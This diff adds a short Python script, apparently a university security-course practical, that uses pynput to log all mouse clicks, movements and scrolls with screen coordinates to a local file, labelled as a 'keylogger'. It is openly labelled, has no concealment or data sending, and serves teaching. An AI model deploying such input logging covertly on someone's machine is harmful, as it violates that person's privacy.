@@ -1,0 +1,22 @@
+print("\tSecurity Assessment, Architecture and Design \n\tPractical No. 2 - Keylogger (on Mouse)")
+from pynput import mouse
+log_file = "D:/Keylogger/log_mouse.txt"
+# Function to write mouse events to file
+def write_to_file(event):
+    with open(log_file, "a") as file:
+        file.write(event + "\n")
+# Function for mouse click events
+def on_click(x, y, button, pressed):
+    if pressed:
+        write_to_file(f"Mouse Clicked at ({x}, {y}) with {button}")
+# Function for mouse movement events
+def on_move(x, y):
+    write_to_file(f"Mouse Moved to ({x}, {y})")
+# Function for mouse scroll events
+def on_scroll(x, y, dx, dy):
+    write_to_file(f"Mouse Scrolled at ({x}, {y}) with delta ({dx}, {dy})")
+# Setting up listener
+with mouse.Listener(on_click=on_click, on_move=on_move, on_scroll=on_scroll) as listener:
+    listener.join()
+
+#package---- pip Install pynput
